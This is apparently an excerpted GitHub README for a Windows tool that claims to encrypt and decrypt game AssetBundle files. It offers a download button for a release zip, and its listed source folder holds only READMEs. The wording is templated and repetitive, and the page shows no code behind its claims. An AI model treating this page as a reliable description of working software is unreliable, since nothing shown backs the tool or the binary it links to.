...
<img src="preview.svg" alt="Assetbundle Encrypt" width="100%"/>

# Assetbundle Encrypt

**AssetBundle encrypt/decrypt tool — Windows desktop utility with batch export workflow**
...
**Assetbundle Encrypt** is a Windows-focused desktop utility for **assetbundle encrypt/decrypt tool**. Point it at a local game folder or archive, pick an export preset, and run a batch job — no manual hex editing required.
...
| Format handler | Custom headers, keys, and container layouts supported |
...
[![Download](button.svg)](https://github.com/Roofoviaduct/assetbundle-encrypt-decrypt-tool/releases/download/v4.5.67/assetbundle-encrypt-decrypt-tool-v4.5.67.zip)
...
```
assetbundle-encrypt-decrypt-tool/
├── docs/
│   └── QUICKSTART.md
├── src/
│   └── README.md
...
<div align="center">
<sub>Windows · Game asset tooling · Open Source · assetbundle-encrypt-decrypt-tool</sub>
</div>
